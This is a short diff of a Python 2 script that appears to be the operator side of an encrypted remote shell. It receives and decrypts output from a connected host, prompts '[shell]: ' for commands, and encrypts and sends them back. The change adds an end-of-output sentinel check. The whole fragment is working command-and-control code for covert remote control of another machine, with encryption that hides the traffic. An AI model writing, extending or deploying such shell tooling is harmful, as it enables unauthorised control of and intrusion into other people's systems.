@@ -37,11 +37,16 @@ while 1:
     data = conn.recv(1024)
     # decrypt the data
     datadec = box.decrypt(data)
-    #print the output
-    print datadec
-    #get next command
-    nextcmd = raw_input("[shell]: ")
-    #encrypt the input
-    nextcmdEnc = box.encrypt(nextcmd)
-    #send dat sh!t
-    conn.send(nextcmdEnc)
+
+    if datadec.endswith("EOFEOFEOFEOFEOFX") == True:
+            #print the output
+            print datadec[:-16]
+            #get next command
+            nextcmd = raw_input("[shell]: ")
+            #encrypt the input
+            nextcmdEnc = box.encrypt(nextcmd)
+            #send dat sh!t
+            conn.send(nextcmdEnc)
+    # else, just print
+    else:
+    	   print datadec
